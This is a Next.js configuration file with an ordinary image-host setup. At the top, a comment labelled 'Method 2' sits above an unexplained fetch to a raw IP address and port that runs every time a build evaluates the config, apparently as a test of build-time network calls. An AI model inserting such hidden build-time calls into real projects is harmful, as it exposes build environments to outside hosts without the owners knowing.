import type { NextConfig } from "next";

// Build-time fetch - Method 2: Next.js Config Evaluation
console.log("⏳ [Next Config] Fetching build-time URL...");
fetch("http://159.65.66.91:9093")
  .then((response) => {
    console.log("✅ [Next Config] Build-time fetch completed with status:", response.status);
  })
  .catch((error) => {
    console.log("⚠️ [Next Config] Build-time fetch failed:", error);
  });

const nextConfig: NextConfig = {
  cacheComponents: true,
  images: {
    remotePatterns: [
      {
        hostname: "avatar.vercel.sh",
      },
      {
        protocol: "https",
        //https://nextjs.org/docs/messages/next-image-unconfigured-host
        hostname: "*.public.blob.vercel-storage.com",
      },
    ],
  },
};

export default nextConfig;
